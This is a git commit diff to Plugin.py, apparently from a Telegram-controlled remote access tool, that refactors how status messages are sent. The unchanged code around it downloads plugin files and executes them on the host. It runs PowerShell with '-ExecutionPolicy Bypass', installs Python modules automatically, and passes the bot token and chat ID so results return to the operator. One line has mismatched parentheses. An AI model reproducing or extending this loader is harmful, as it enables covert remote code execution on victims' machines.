a75d3a243c670d009b615c71641e6b629fe1d65d
UQABXO <92090431+UQABXO@users.noreply.github.com>
2022-04-07 08:22:07 +0300

    Update Plugin.py

--- Plugin.py
+++ Plugin.py
@@ -9,7 +9,6 @@ class Plugin():
 		self.token = _.token
 		self.plugin = _.args[0]
 		self.chat_id = _.chat_id
-		self.Send_Message = _.Send_Message
 		self.Main()
 
 	def Main(self):
@@ -26,9 +25,9 @@ class Plugin():
 				sub = subprocess.Popen(["powershell.exe","-ExecutionPolicy","Bypass","-File",filename,self.token, self.chat_id],shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
 				output, error = sub.communicate()
 				if error:
-					self.Send_Message.Send("%E2%9C%96%EF%B8%8F Failed Execute Plugin\n\n%E2%9D%96 Error : \n" + error)
+					self._.Send_Message("%E2%9C%96%EF%B8%8F Failed Execute Plugin\n\n%E2%9D%96 Error : \n" + error)
 			elif self.plugins[self.plugin]["Extention"] == "Py":
-				self.Send_Message.Send("%F0%9F%93%8C Checking Modules...")
+				self._.Send_Message("%F0%9F%93%8C Checking Modules...")
 				for i in req.text.split("\n"):
 					if "import " in i:
 						try:
@@ -38,15 +37,15 @@ class Plugin():
 								module = re.findall("from (.*?) import", i)[0].split(".")[0]
 							elif i.startswith("import "):
 								module = i.replace("import ","").split(".")[0]
-							self.Send_Message.Send("%F0%9F%93%8C Installing (" + module + ")" + " Module...")
+							self._.Send_Message("%F0%9F%93%8C Installing (" + module + ")" + " Module...")
 							self._.Install_Module(module)
 				sub = subprocess.Popen([path.dirname(sys.executable)), filename, self.token, self.chat_id], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 			else:
 				sub = subprocess.Popen([filename, self.token, self.chat_id] ,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 			output, error = sub.communicate()
 			if not error:
-				self.Send_Message.Send("%E2%9C%94%EF%B8%8F Plugin (" + self.plugin + ")" + " Executed")
+				self._.Send_Message("%E2%9C%94%EF%B8%8F Plugin (" + self.plugin + ")" + " Executed")
 			else:
-				self.Send_Message.Send("%E2%9C%96%EF%B8%8F Failed Execute (" + self.plugin + ")" + " Plugin\n\n%E2%9D%96 Error : " + error)
+				self._.Send_Message("%E2%9C%96%EF%B8%8F Failed Execute (" + self.plugin + ")" + " Plugin\n\n%E2%9D%96 Error : " + error)
 		else:
-			self.Send_Message.Send("%E2%9C%96%EF%B8%8F Plugin (" + self.plugin + ")" + " Not Found")
+			self._.Send_Message("%E2%9C%96%EF%B8%8F Plugin (" + self.plugin + ")" + " Not Found")
